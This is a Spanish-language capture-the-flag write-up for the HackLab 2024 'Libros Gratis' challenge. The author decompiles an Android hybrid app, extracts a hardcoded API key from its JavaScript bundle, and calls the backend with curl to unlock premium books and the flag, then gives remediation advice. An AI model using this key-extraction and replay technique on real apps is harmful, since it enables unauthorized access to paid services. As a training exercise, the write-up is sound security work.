# Libros Gratis — Writeup

- **Plataforma:** SoftwareSeguro (HackLab 2024)
- **ID Desafío:** 31
- **Categoría:** Broken Access Control / Reversing APK
- **Autor / Colaborador:** `adonaissh`
- **Vulnerabilidades:** CWE-284 (Improper Access Control), CWE-798 (Use of Hard-coded Credentials / Static API Key)

---

## 1. Enunciado

Una aplicación móvil Android ("Libros Gratis") permite acceder a una biblioteca de libros: la mayoría son gratuitos, pero algunos son exclusivos para usuarios con licencia premium (pago).  
El objetivo es lograr acceder a los libros pagos sin contar con una licencia adquirida legalmente.

Se provee el archivo `libros-gratis.apk`.

---

## 2. Reconocimiento y Descompilación

Un análisis preliminar del paquete APK reveló que se trata de una aplicación híbrida construida con **Ionic / Angular + Capacitor / Cordova**.  
En este tipo de arquitecturas, la lógica de negocio y las llamadas a la API no residen en clases nativas Java/Kotlin, sino empaquetadas como assets web (`HTML`, `CSS`, `JavaScript`) dentro del directorio `resources/assets/public/` (bundles compilados con Angular/Webpack).

### Paso 1: Descompilación con JADX
```bash
~/jadx/bin/jadx libros-gratis.apk -d salida/
```

Al inspeccionar los archivos `.java` nativos únicamente se identificaron clases base del runtime de Cordova/Capacitor. Por lo tanto, se procedió a auditar los bundles JavaScript:

```bash
find salida/resources/assets/public -name "*.js" -exec grep -l -i "premium\|pago\|libro\|book\|paid\|free" {} \;
```

El filtrado identificó el bundle clave: `6441.54dfd7d96a0b3552.js`.

### Paso 2: Extracción de Endpoints y Lógica de Negocio
Se extrajeron todas las URLs absolutas presentes en los assets:

```bash
grep -oE "https?://[a-zA-Z0-9./_-]+" salida/resources/assets/public/*.js | sort -u
```

Esto reveló la URL base del servicio backend:
```text
https://libros-gratis.shared.softwareseguro.com.ar/books/
```

Analizando las referencias a `premium` y `getBooks` en el bundle:

```bash
grep -o -i ".\{150\}getBooks.\{150\}" salida/resources/assets/public/6441.54dfd7d96a0b3552.js
```

Se reconstruyó la lógica del servicio Angular:

```javascript
class BookService {
  constructor(http) {
    this.http = http;
    this.apiUrl = "https://libros-gratis.shared.softwareseguro.com.ar/books/";
  }
  getBooks(apiKey = "") {
    let params = new HttpParams();
    if (apiKey != null && apiKey !== "") params = params.set("api_key", apiKey);
    return this.http.get(this.apiUrl, { params });
  }
}

class HomePage {
  constructor(bookService) {
    this.bookService = bookService;
    this.apiKey = "024daaec-bd26-42c7-b9af-4a5d6a67c643"; // <-- Hardcodeada en el bundle cliente
    this.books = [];
    this.isUserPremium = false;
    this.loadBooks();
  }

  loadPremium() {
    // La acción de la UI invoca al endpoint con la misma API key estática
    this.bookService.getBooks(this.apiKey).subscribe(books => this.books = books);
  }

  loadBooks() {
    this.isUserPremium
      ? this.bookService.getBooks(this.apiKey).subscribe(books => this.books = books)
      : this.bookService.getBooks().subscribe(books => this.books = books);
  }
}
```

---

## 3. Análisis de la Vulnerabilidad

Se determinó un fallo crítico de **Broken Access Control** combinado con **Hardcoded Secret**:
1. El backend restringe la entrega de libros premium exigiendo únicamente el parámetro de consulta `?api_key=...`.
2. Dicha `api_key` se encuentra hardcodeada dentro del código JavaScript del APK (`024daaec-bd26-42c7-b9af-4a5d6a67c643`), haciéndola pública para cualquiera que descompile la app.
3. El flag booleano `isUserPremium` se evalúa únicamente en el cliente, careciendo de validación del lado del servidor respecto a la identidad del usuario o el estado de pago.

---

## 4. Explotación

Dado que el control se limita a presentar la clave API estática, no es necesario instalar ni ejecutar el APK en un emulador Android. Basta con realizar la petición HTTP directa utilizando `curl`:

```bash
curl -s "https://libros-gratis.shared.softwareseguro.com.ar/books/?api_key=024daaec-bd26-42c7-b9af-4a5d6a67c643" | python3 -m json.tool
```

### Respuesta del Servidor
La API retornó la lista completa de libros, incluyendo los catalogados con `"is_premium": true`:

```json
{
    "id": 7,
    "title": "HackLab 2024",
    "author": "UTN",
    "category": "cybersecurity",
    "is_premium": true,
    "description": "Felicitaciones!!! 072732555487fd2b9906d37c3d1217b2",
    "publication_year": 2024,
    "recommended_level": "Avanzado"
}
```

---

## 5. Flag Obtenida

```text
072732555487fd2b9906d37c3d1217b2
```

---

## 6. Causa Raíz

- **Control de Acceso Delegado al Cliente (CWE-602):** La restricción de acceso a funciones o datos premium no debe depender de banderas booleanas del lado del cliente (`isUserPremium`).
- **Uso de Claves API Estáticas y Hardcodeadas (CWE-798):** Embeber secretos en assets de aplicaciones móviles (binarios nativos o bundles JS) equivale a exponerlos públicamente.
- **Falta de Autenticación de Usuario:** El servidor entrega recursos sensibles sin vincular la petición a una sesión o cuenta con suscripción activa verificada.

---

## 7. Remediación Defensiva (OWASP)

1. **Control de Autorización Server-Side:** La API debe validar la sesión autenticada del usuario (mediante tokens JWT o sesiones) y contrastar en base de datos si su cuenta posee una suscripción activa antes de despachar objetos con `"is_premium": true`.
2. **Cero Secretos en el Cliente:** Nunca hardcodear credenciales, API keys maestras ni tokens de servicio en el frontend o bundles de distribución.
3. **Rotación de Credenciales Expuestas:** Invalidar inmediatamente la clave `024daaec-bd26-42c7-b9af-4a5d6a67c643` y auditar los registros de acceso para detectar consumo no autorizado.
4. **Protección de Assets:** Aplicar técnicas de empaquetado seguro y ofuscación (ProGuard, R8, Terser) como defensa en profundidad, recordando que la seguridad fundamental siempre debe recaer en el backend.

---

## 8. Herramientas Utilizadas

- **JADX:** Descompilación de APK a recursos y código fuente.
- **`find` / `grep`:** Búsqueda rápida de cadenas, endpoints y lógica de negocio en assets JavaScript.
- **`curl`:** Replicación de la solicitud HTTP con el query param `api_key`.
- **Python 3 (`json.tool`):** Formateo y lectura de la respuesta JSON.
